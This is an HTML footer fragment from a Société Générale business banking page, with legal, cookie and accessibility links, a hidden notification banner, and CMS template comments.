<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="/charte-cookies-sg">Gestion des Cookies</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="/rgpd-charte-donnees-societe-generale">Données personnelles</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="/informations-legales">Informations légales</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="/accessibilitenumerique">Accessibilité Numérique (partiellement conforme)</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="/plan-du-site">Plan du site</a>
</li>
</ul>
</div>
</nav>
<aside class="dcw_msg-banner-supervision dcw_msg-banner-supervision--info" role="alert" id="supervision" style="display:none">
<div class="dcw_msg-banner-supervision_msg-wrapper">
<svg class="dcw_msg-banner-supervision_picto-info" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#info"></use></svg>
<p class="dcw_msg-banner-supervision_message" id="supervisionMessage">

</p>
<button arial-label="Ignorer les parcours obligatoires" class="dcw_msg-banner-supervision_button" id="byPassButton">
Ignorer les parcours obligatoires
</button>
<button arial-label="Fermer le message contextuel" class="dcw_msg-banner-supervision_btn-close" id="Supervision_Close_Btn">
<svg class="dcw_msg-banner-supervision_btn-close_picto" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#arrow-dropdown"></use></svg>
</button>        
</div>
</aside></footer>
<!-- URL: https://entreprises.sg.fr/restcontent/regions/f1d9112f38323710VgnVCM1000000ae1c6c0RCRD -->
<!-- REQUEST PROFILE: , REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: f1d9112f38323710VgnVCM1000000ae1c6c0RCRD, regionNames: gb9-com2-int,gb9-com4-int,footer-int-without-closing-main, FURL_NAME: /ent/authen/footer, FURL_ID: ae1a112f38323710VgnVCM1000000ae1c6c0RCRD -->






</body></html>